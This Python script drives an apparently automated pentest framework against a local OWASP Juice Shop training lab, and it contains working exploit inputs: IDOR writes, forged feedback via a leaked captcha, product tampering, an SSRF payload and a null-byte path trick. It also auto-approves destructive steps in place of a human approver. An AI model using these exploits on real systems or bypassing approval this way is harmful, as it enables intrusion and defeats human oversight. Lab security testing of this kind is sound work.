#!/usr/bin/env python3
r"""Stage 7 CAE — LIVE host runner.

Run ON THE WINDOWS HOST (only it reaches loopback Juice Shop), from
D:\APTS\mission_orchestrator, with Juice Shop up on http://127.0.0.1:3000 :

    python run_cae_live.py                      # read-active + verified mutations
    python run_cae_live.py --read-active        # only the read-active solves
    python run_cae_live.py --challenges forgedReviewChallenge

Drives the Stage 7 CAE gateway (LoopbackHttpTransport + real GET /api/Challenges
oracle), confirming solves via the scoreboard delta. Mutation/destructive steps are
auto-approved here (this runner stands in for the Human Layer :8802 in the lab).
Dynamic exploit inputs (review id, captcha, product id) are resolved by small
read-only "prepare" probes. Every actuation is RoE-guarded and loopback-only.

Live-verified vectors (20 Nov 2026):
  basketAccessChallenge        GET  /rest/basket/{id != own bid}
  easterEggLevelOneChallenge   GET  /ftp/eastere.gg%2500.md
  forgedReviewChallenge        PATCH /rest/products/reviews {id, message}   (edit any review)
  forgedFeedbackChallenge      POST /api/Feedbacks {UserId:1, captchaId, captcha} (captcha leaks answer)
  changeProductChallenge       PUT  /api/Products/{O-Saft id} {description w/ owasp.slack.com href}
Not covered here: web3Sandbox/adminSection (SPA_NAV -> 7.4b browser transport),
basketManipulate (needs cross-origin CSRF), SSRF/CSRF/Five-Star (admin/CSRF/tuning).
"""
from __future__ import annotations

import argparse
import json
import urllib.request

from pentest_subsystem.session_broker import LoopbackHttpTransport
from pentest_subsystem.approval_broker import ApprovalBroker
from pentest_subsystem.active_exploitation_execution import (
    ActiveExploitationGateway, ACTION_CLASS_ACTIVE_EXPLOITATION,
    ACTION_CLASS_STATE_MUTATION, ACTION_CLASS_DESTRUCTIVE)
from pentest_subsystem import exploit_primitive_library as lib
from pentest_subsystem.browser_transport import SeleniumBrowserTransport

BASE = "http://127.0.0.1:3000"
TARGET = {"target_type": "URL", "target_value": BASE}

READ_ACTIVE = ["basketAccessChallenge", "easterEggLevelOneChallenge"]
MUTATION = ["forgedReviewChallenge", "forgedFeedbackChallenge", "changeProductChallenge", "basketManipulateChallenge", "ssrfChallenge"]
SPA = ["web3SandboxChallenge", "adminSectionChallenge"]  # need --browser; Admin also uses escalate-admin-sqli


# --------------------------- small HTTP helpers (loopback) -----------------
def _req(method, path, body=None, token=None):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=headers)  # noqa: S310
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return json.loads(raw) if raw else {}
    except Exception as exc:  # noqa: BLE001
        return {"error": str(exc)}


def oracle_fetch():
    return _req("GET", "/api/Challenges/")


def snapshot():
    return {c["key"]: bool(c.get("solved")) for c in oracle_fetch().get("data", []) if c.get("key")}


def _prep_login():
    import secrets
    tok = secrets.token_hex(6)
    email, pw = f"aptslab+prep{tok}@lab.local", f"Lab!{tok}Aa1"
    _req("POST", "/api/Users", {"email": email, "password": pw, "passwordRepeat": pw,
                                "securityQuestion": {"id": 1, "question": "x"}, "securityAnswer": "lab"})
    login = _req("POST", "/rest/user/login", {"email": email, "password": pw})
    return login.get("authentication", {}).get("token")


# --------------------------- per-challenge prepare -------------------------
def _prep_forged_review(token):
    rev = _req("GET", "/rest/products/1/reviews", token=token)
    rid = rev["data"][0]["_id"]
    return {"idor-write-review": {"body": {"id": rid, "message": "Edited by APTS CAE"}}}


def _prep_forged_feedback(token):
    cap = _req("GET", "/rest/captcha/", token=token)
    return {"param-tamper-feedback": {"body": {"comment": "APTS CAE forged", "rating": 1, "UserId": 1,
                                               "captchaId": cap["captchaId"], "captcha": str(cap["answer"])}}}


def _prep_product_tampering(token):
    prods = _req("GET", "/api/Products", token=token)
    osaft = next(p for p in prods["data"] if "O-Saft" in p.get("name", ""))
    import re
    new_desc = re.sub(r'href="[^"]*"', 'href="https://owasp.slack.com"', osaft["description"])
    return {"idor-write-product": {"id": osaft["id"], "body": {"description": new_desc}}}


PREPARE = {
    "forgedReviewChallenge": _prep_forged_review,
    "forgedFeedbackChallenge": _prep_forged_feedback,
    "changeProductChallenge": _prep_product_tampering,
}

# Static params for challenges whose exploit input is built by the gateway itself
# (e.g. basket HPP raw body uses the gateway session's own bid + a target basket).
_SSRF_INTERNAL = ("imageUrl=http%3A%2F%2Flocalhost%3A3000%2Fsolve%2Fchallenges%2F"
                  "server-side%3Fkey%3DtRy_H4rd3r_n0thIng_iS_Imp0ssibl3")
STATIC_PARAMS = {
    "basketManipulateChallenge": {"idor-write-basket": {"target_basket": 1, "product": 14}},
    "ssrfChallenge": {"ssrf-profile-image": {"raw_body": _SSRF_INTERNAL,
                                             "content_type": "application/x-www-form-urlencoded"}},
}


# --------------------------- governance / gateway --------------------------
def roe():
    return {
        "active_exploitation_allowed": True,
        "allowed_action_classes": [ACTION_CLASS_ACTIVE_EXPLOITATION, ACTION_CLASS_STATE_MUTATION, ACTION_CLASS_DESTRUCTIVE],
        "allowed_http_methods": ["GET", "POST", "PUT", "PATCH", "DELETE"],
        "allowed_auth_modes": ["SELF_REGISTERED_LAB_ACCOUNT", "SQLI_LOGIN_LAB_ONLY"],
        "credential_usage_allowed": True,
        "human_approval_required_for": [ACTION_CLASS_STATE_MUTATION, ACTION_CLASS_DESTRUCTIVE],
        "destructive_actions_allowed": True,
        "target_allowlist": ["127.0.0.1:3000"],
        "environment": "LAB",
        "blast_radius": {"max_mutations": 50, "max_requests": 500, "max_duration_s": 1800},
    }


def _auto_tokens(broker, action_class, primitive_id, approvers):
    out = []
    for ap in approvers:
        card = broker.request_approval(action_class=action_class, primitive_id=primitive_id,
                                       target=TARGET, http_method="POST", orchestration_id="live")
        out.append(broker.approve(card["approval_id"], approver=ap))
    return out


def run_one(challenge, token, browser_transport=None):
    broker = ApprovalBroker()
    gw = ActiveExploitationGateway(
        roe(), transport=LoopbackHttpTransport(), oracle_fetcher=oracle_fetch, approval_broker=broker,
        browser_transport=browser_transport,
        enable_classes=[ACTION_CLASS_ACTIVE_EXPLOITATION, ACTION_CLASS_STATE_MUTATION, ACTION_CLASS_DESTRUCTIVE])
    chain = lib.primitives_for_challenge(challenge)
    cls = lib.get_primitive(chain[-1])["action_class"]
    params = PREPARE[challenge](token) if challenge in PREPARE else STATIC_PARAMS.get(challenge, {})
    approval_tokens = {}
    if cls == ACTION_CLASS_STATE_MUTATION:
        approval_tokens[cls] = _auto_tokens(broker, cls, chain[-1], ["lab-approver"])
    elif cls == ACTION_CLASS_DESTRUCTIVE:
        approval_tokens[cls] = _auto_tokens(broker, cls, chain[-1], ["approver-a", "approver-b"])
    return gw.run_chain("live", TARGET, chain, parameters=params, approval_tokens=approval_tokens)


def main():
    ap = argparse.ArgumentParser(description="Stage 7 CAE live runner (loopback Juice Shop)")
    ap.add_argument("--challenges", nargs="*")
    ap.add_argument("--read-active", action="store_true", help="only read-active challenges")
    ap.add_argument("--browser", action="store_true", help="enable Selenium browser transport for SPA challenges (Web3)")
    args = ap.parse_args()

    browser_transport = SeleniumBrowserTransport() if args.browser else None

    targets = args.challenges or (READ_ACTIVE if args.read_active else READ_ACTIVE + MUTATION + (SPA if args.browser else []))
    token = _prep_login()
    before = snapshot()
    print(f"Target: {BASE}  |  solved before: {sum(before.values())}")
    print(f"Attempting: {targets}\n")

    for ch in targets:
        try:
            run = run_one(ch, token, browser_transport)
        except Exception as exc:  # noqa: BLE001
            print(f"  {ch}: ERROR {exc}")
            continue
        chain = " -> ".join(f"{s['primitive_id']}:{s['outcome']}" for s in run["steps"])
        print(f"  {ch}: [{run['stop_reason']}, req={run['requests_performed']}]  {chain}")

    after = snapshot()
    newly = sorted(k for k in after if after[k] and not before.get(k))
    print(f"\nSolved after: {sum(after.values())}  |  newly solved this run: {newly}")


if __name__ == "__main__":
    main()
